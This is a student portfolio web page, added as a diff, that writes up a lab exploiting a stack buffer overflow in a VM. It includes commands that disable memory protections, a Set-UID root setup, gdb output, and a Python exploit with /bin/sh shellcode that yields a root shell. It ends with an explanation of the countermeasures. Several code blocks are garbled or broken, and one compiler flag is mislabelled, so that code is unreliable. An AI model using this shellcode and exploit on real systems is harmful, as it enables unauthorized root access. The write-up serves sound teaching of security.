@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Buffer Overflow Exploitation Project</title>
+
+    <!-- External Styles -->
+      <link rel="stylesheet" href="../projects_css/main.css">
+</head>
+
+<body>
+
+    <!-- ===== HERO ===== -->
+    <header class="hero">
+        <h1>Buffer Overflow Exploitation Project</h1>
+    </header>
+
+    <!-- ===== NAVBAR ===== -->
+    <nav class="navbar">
+        <a href="../kalihome.html#projects?cat=cyber" class="back-link">X</a>
+    </nav>
+
+    <!-- ===== MAIN CONTENT ===== -->
+    <section class="project-section">
+
+        <h2 class="section-title">2023 September</h2>
+        <p class="subtitle">
+          Exploiting a classic stack-based buffer overflow,
+            defeating system countermeasures, injecting shellcode, and achieving a root shell.
+        </p>
+
+        <p>
+            Performed in Ubuntu Virtal Box this project explores memory corruption vulnerabilities in C programs, techniques for
+            bypassing stack protections, and privilege escalation using Set-UID executable exploitation.
+        </p>
+
+        <!-- ====================== TASK 01 ======================= -->
+        <h2 class="task-heading">Task 01 — Identifying the Vulnerability</h2>
+
+        <p>
+            Below is the vulnerable C program and the corresponding stack frame. The vulnerable
+            function accepts multiple parameters and writes user-controlled data into a fixed-size buffer.
+        </p>
+
+        <div class="code-block">
+<pre><code>
+#include < stdio.h>
+#include < string.h>
+
+void vuln_func(char *input) {
+char buffer[64];
+strcpy(buffer, input);
+
+int main(int argc, char ** argv) {
+if (argc != 2) {
+printf("Usage: %s < input >\n", argv[0]);
+return 1;
+
+vuln_func(argv[1]);
+
+printf("Successful.\n");
+
+return 0;
+</code></pre>
+        </div>
+
+        <p>
+            Running the compiled file with a long input triggers stack-smashing detection due to buffer overflow.
+        </p>
+
+        <p>
+           I recompile the program with -Wall -fno-stack-protector commands. It outputted Segmentation fault because the memory location is read only. 
+        </p>
+
+        <!-- ====================== TASK 02 ======================= -->
+        <h2 class="task-heading">Task 02 — Disabling Countermeasures</h2>
+
+        <p>
+            To successfully perform this lab, countermeasures must be disabled:
+        </p>
+
+        <ul>
+            <li>Address Space Layout Randomization (ASLR)</li>
+            <li>StackGuard (stack protector)</li>
+            <li>Non-executable stack (NX)</li>
+        </ul>
+
+        <div class="code-block">
+<pre><code>//Disable ASLR 
+    sudo sysctl -w kernel.randomize_va_space=0
+//Point to another shell that doesn’t have countermeasures
+    sudo ln -sf /bin/zsh /bin/sh
+//Disable StackGuard
+    gcc -fno-stack-protector stack.c
+//Disable non-executable
+    gcc -z noexecstack -o stack stack.c
+</code></pre>
+        </div>
+
+        <!-- ====================== TASK 03 ======================= -->
+        <h2 class="task-heading">Task 03 — Shellcode Compilation</h2>
+
+        <p>
+            The C and assembly version of the shellcode were analyzed and compiled as executable code.
+        </p>
+
+        <div class="code-block">
+<pre><code>gcc -z execstack -o shellcode shellcode.c
+make  #(Makefile = gcc -m32 -z execstack -o a32.out shellcode.c, gcc -z execstack -o a64.out shellcode.c)  
+# compiles a32.out and a64.out
+</code></pre>
+        </div>
+
+        <p>
+            The 32-bit version uses a 4GB address space, while the 64-bit version supports a much larger memory model.
+        </p>
+
+        <!-- ====================== TASK 04 ======================= -->
+        <h2 class="task-heading">Task 04 — Set-UID Privilege Escalation</h2>
+
+        <p>
+            To escalate privileges, the vulnerable program was made Set-UID and owned by root:
+        </p>
+
+        <div class="code-block">
+<pre><code>sudo chown root stack
+sudo chmod 4755 stack
+</code></pre>
+        </div>
+           <div class="code-block">
+<pre><code>//In the vulnerable program the function bof has the buffer overflow vulnerability. 
+//Basically, this function uses strcpy to put the string parameter into the buffer memory location. 
+//If the string exceeds the size of the buffer the buffer will overflow.
+
+int bof(char *str)                    
+{
+
+char buffer[BUF_SIZE];              
+strcpy(buffer, str);
+
+return 1;
+
+}                           
+                             <img src="../images/Z_images/stack.png" alt="DES Output Example" class="project-image">
+</code></pre>
+
+        </div>
+
+        <p>
+            When executed, the overflow overwrites the return address and injects shellcode into the stack,
+            granting a root shell.
+        </p>
+
+          <p>
+            
+        </p>
+
+        <div class="code-block">
+<pre><code>cysec@VM :~ /code$ make
+gcc -DBUF_SIZE=110 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c
+gcc -DBUF_SIZE=110 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg st
+ack.c
+sudo chown root stack-L1 && sudo chmod 4755 stack-L1
+gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c
+gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg st
+ack.c
+sudo chown root stack-L2 && sudo chmod 4755 stack-L2
+gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c
+gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -g -o stack-L3-dbg stack.c
+sudo chown root stack-L3 && sudo chmod 4755 stack-L3
+gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -o stack-L4 stack.c
+gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -g -o stack-L4-dbg stack.c
+sudo chown root stack-L4 && sudo chmod 4755 stack-L4
+
+cysec@VM :~ code$ ls
+stack stack.c stack-L1 stack-L1-dbg stack-L2 stack-L2-dbg
+stack-L3 stack-L3-dbg stack-L4 stack-L4-dbg a.out exploit.py Makefile
+</code></pre>
+        </div>
+
+        <!-- ====================== TASK 05 ======================= -->
+        <h2 class="task-heading">Task 05 — Crafting the Malicious Input (badfile)</h2>
+
+        <p>
+            Using gdb, I determined the base of the buffer and the location of the return address.
+            By subtracting the buffer start address from the saved EBP, I calculated an offset of 118 bytes.
+        </p>
+
+        <div class="code-block">
+<pre><code>
+Reading symbols from stack-L1-dbg ...
+(gdb) b bof
+Breakpoint 1 at 0x12ad: file stack.c, line 12.
+(gdb) run
+Starting program: /home/cysec/code/stack-L1-dbg
+Input size: 0
+
+Breakpoint 1, bof (str=0xffffcf43 "V\004") at stack.c:12
+12
+(gdb) next
+14
+(gdb) p $ebp
+$1 = (void *) Oxffffcb18
+(gdb) exit
+Undefined command: "exit". Try "help".
+(gdb) quit
+A debugging session is active.
+
+Inferior 1 [process 7292] will be killed.
+
+Quit anyway? (y or n) y
+</code></pre>
+        </div>
+
+        <p>
+            The payload was constructed by placing shellcode at the end of a 517-byte buffer and overwriting the
+            return address with the buffer’s start location + offset.
+        </p>
+         <div class="code-block">
+<pre><code>
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+
+shellcode= ( "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+"\X62\X69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+"\xd2\x31\xc0\xb0\x0b\xcd\x80").encode('latin-1')
+
+# Change this number
+
+ret
+
+# Change this number
+# Change thts number
+
+L = 4
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+###################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)
+content[start:start + len(shellcode)] = shellcode
+
+# Dectde the return address value
+# and put it somewhere in the payload
+= 0xffffcb18 + 140
+offset = 122
+
+# Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+*##########
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+f.write(content)
+</code></pre> 
+</div>
+        
+        <p>
+            Running the vulnerable program using the crafted badfile resulted in a root shell.
+        </p>
+ <div class="code-block">
+<pre><code>
+cysec@VM :~ /CYSEC/code$ python3 exploit.py
+cysec@VM :~ /CYSEC/code$ ./stack-L1
+Input size: 517
+# I got root shell!
+</code></pre></div>
+       
+<p>I opened the badfile file in the bless hex editor. Then I highlighted the malicious code and the return address in the screenshot below:</p>
+<img src="../images/Z_images/bof.png" alt="DES Output Example" class="project-image">
+        <!-- ====================== TASK 06 ======================= -->
+        <h2 class="task-heading">Countermeasure Analysis</h2>
+
+        <h3>Countermeasure Explanations</h3>
+
+        <ul>
+            <li><strong>ASLR:</strong> Randomizes memory layouts, preventing reliable return address prediction.</li>
+            <li><strong>StackGuard:</strong> Inserts canaries to detect buffer overflows before altering control flow.</li>
+            <li><strong>Non-Executable Stack:</strong> Prevents injected shellcode from running on the stack.</li>
+            <li><strong>Control-Flow Integrity:</strong> Ensures functions return only to valid call sites.</li>
+            <li><strong>Static Code Analysis:</strong> Detects insecure functions before compilation.</li>
+        </ul>
+
+        <br><br>
+    </section>
+
+</body>
+</html>
